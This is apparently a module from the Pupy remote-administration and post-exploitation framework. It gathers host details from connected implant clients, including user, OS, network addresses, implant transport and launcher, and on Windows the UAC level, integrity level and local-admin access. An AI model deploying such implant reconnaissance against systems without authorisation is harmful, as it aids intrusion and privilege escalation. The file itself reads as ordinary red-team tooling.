# -*- coding: utf-8 -*-
from pupylib.PupyModule import *

__class_name__="GetInfo"

@config(cat="gather")
class GetInfo(PupyModule):
    """ get some informations about one or multiple clients """
    dependencies = {
        'all': [ "psutil" ],
        'windows': [ "pupwinutils.security" ],
    }

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='get_info', description=self.__doc__)
        #self.arg_parser.add_argument('arguments', nargs='+', metavar='<command>')

    def run(self, args):
        commonKeys = ["hostname", "user", "release", "version", "os_arch", "proc_arch", "pid", "exec_path", "address", "macaddr"]
        pupyKeys = ["transport", "launcher", "launcher_args"]
        windKeys = ["uac_lvl","intgty_lvl"]
        linuxKeys = ["daemonize"]
        macKeys = []
        infos=""
        for k in commonKeys:
            infos+="{:<10}: {}\n".format(k,self.client.desc[k])
        if self.client.is_windows():
            self.client.load_package("psutil")
            self.client.load_package("pupwinutils.security")
            for k in windKeys:
                infos+="{:<10}: {}\n".format(k,self.client.desc[k])
            currentUserIsLocalAdmin = self.client.conn.modules["pupwinutils.security"].can_get_admin_access()
            desc = "local_adm"
            if currentUserIsLocalAdmin == True:
                infos+="{:<10}: {}\n".format(desc,"Yes")
            elif currentUserIsLocalAdmin == False:
                infos+="{:<10}: {}\n".format(desc,"No")
            else:
                infos+="{:<10}: {}\n".format(desc,"?")
        elif self.client.is_linux():
            for k in linuxKeys:
                infos+="{:<10}: {}\n".format(k,self.client.desc[k])
        elif self.client.is_darwin():
            for k in macKeys:
                infos+="{:<10}: {}\n".format(k,self.client.desc[k])
        for k in pupyKeys:
            infos+="{:<10}: {}\n".format(k,self.client.desc[k])
        self.rawlog(infos)
